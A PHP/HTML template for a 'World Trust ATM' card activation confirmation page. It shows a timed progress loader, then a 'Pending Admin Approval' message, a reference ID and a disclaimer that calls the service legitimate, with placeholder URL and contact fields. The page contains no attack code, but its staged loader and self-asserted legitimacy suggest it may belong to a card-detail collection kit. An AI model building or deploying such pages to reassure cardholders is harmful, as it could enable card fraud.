<?php
/**
 * World Trust ATM - Card Activation
 * Pending Review Page
 */

require_once 'includes/config.php';
require_once 'includes/functions.php';

// Check session
check_user_session();
check_session_timeout();

$user_name = get_full_name();
$request_id = $_SESSION['request_id'] ?? null;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo APP_NAME; ?> - Processing Request</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <h1 class="logo"><?php echo APP_NAME; ?></h1>
            <p class="tagline"><?php echo APP_TAGLINE; ?></p>
        </header>

        <!-- Loading Container (shown initially) -->
        <div class="loading-container" id="loadingContainer">
            <div class="loading-spinner"></div>
            <p class="loading-text" id="loadingText">Processing your activation request...</p>
            <div class="progress-bar-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <p class="progress-text"><span id="progressPercent">0</span>% Complete</p>
        </div>

        <!-- Pending Message (hidden initially, shown after loader) -->
        <div class="card-display-container" id="pendingContainer" style="display: none;">
            <div class="warning-icon">⏳</div>
            <h2 class="pending-message">Application Pending Review</h2>
            
            <div class="pending-details">
                <p style="color: var(--text-dark); margin-bottom: 20px; line-height: 1.6;">
                    Thank you for completing the activation process, <strong><?php echo htmlspecialchars($user_name); ?></strong>.
                </p>
                
                <p style="color: var(--text-dark); margin-bottom: 20px; line-height: 1.6;">
                    Your card activation request has been submitted successfully and is currently under review by our verification team.
                </p>
                
                <div class="info-box">
                    <div class="info-item">
                        <span class="info-label">Reference ID:</span>
                        <span class="info-value"><?php echo str_pad($request_id ?? '000', 6, '0', STR_PAD_LEFT); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Status:</span>
                        <span class="info-value status-pending">Pending Admin Approval</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Submitted:</span>
                        <span class="info-value"><?php echo date('F j, Y g:i A'); ?></span>
                    </div>
                </div>
                
                <div class="alert-box">
                    <h3 style="margin-bottom: 10px; font-size: 16px;">What happens next?</h3>
                    <ul style="text-align: left; margin: 0; padding-left: 20px; line-height: 1.8;">
                        <li>Our security team will review your application within 24-48 hours</li>
                        <li>You will receive an email notification once your card is approved</li>
                        <li>After approval, your card will be active and ready to use</li>
                        <li>Please keep your Reference ID for future inquiries</li>
                    </ul>
                </div>
                
                <p style="color: var(--text-light); font-size: 14px; margin-top: 30px;">
                    If you have any questions, please contact our customer support with your Reference ID.
                </p>
            </div>
        </div>
        
        <!-- Disclaimer -->
        <div class="disclaimer">
            <div class="disclaimer-title">Security Disclaimer</div>
            <p>This is a legitimate card activation service. We will never ask for your PIN, full card number via email/text, or request payment to activate your card. Always verify you're on the correct website URL (https://[yoursite.com]) before entering any information.  If you receive suspicious emails or calls claiming to be from us, do not provide any personal information and contact our security team immediately at [security phone/email]. Your data is protected with bank-level encryption and will never be sold to third parties. </p>
        </div>
    </div>
    
    <script src="js/pending.js"></script>
</body>
</html>
